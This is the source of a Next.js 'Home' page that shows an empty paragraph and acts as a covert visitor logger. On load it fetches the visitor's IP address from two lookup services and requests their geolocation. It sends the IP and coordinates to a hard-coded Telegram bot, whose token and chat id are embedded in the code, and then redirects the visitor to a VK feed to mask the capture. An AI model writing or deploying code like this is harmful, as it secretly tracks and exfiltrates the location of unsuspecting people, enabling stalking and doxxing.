"use client"
import { useEffect } from "react"

export default function Home() {
  useEffect(() => {
    let ip = ""
    let ip2 = ""
    fetch("https://checkip.amazonaws.com/")
      .then((res) => res.text())
      .then((data) => {
        ip = data
      })
      .then(() => {
        fetch("https://api.db-ip.com/v2/free/self")
          .then((res) => res.text())
          .then((data) => {
            ip2 = data
            navigator.geolocation.getCurrentPosition((position) => {
              const { latitude, longitude } = position.coords
              fetch(
                `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}%0A%0A${latitude}%0A%0A${longitude}`
              ).then(() => {
                window.location.href = "https://vk.com/feed"
              })
            })
          })
      })
      .catch((error) => {
        console.error("Error fetching data:", error)
      })
  }, [])
  return <p></p>
}
